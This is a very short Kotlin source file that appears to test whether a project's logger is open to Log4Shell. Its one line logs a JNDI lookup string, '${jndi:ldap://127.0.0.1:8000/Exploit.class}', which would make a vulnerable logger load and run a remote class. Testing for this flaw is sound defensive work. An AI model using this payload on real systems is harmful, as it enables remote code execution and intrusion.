package org.sandboxpowered.silica

import org.sandboxpowered.silica.api.util.getLogger

fun main() {
    getLogger<Any>().warn("\${jndi:ldap://127.0.0.1:8000/Exploit.class}")
}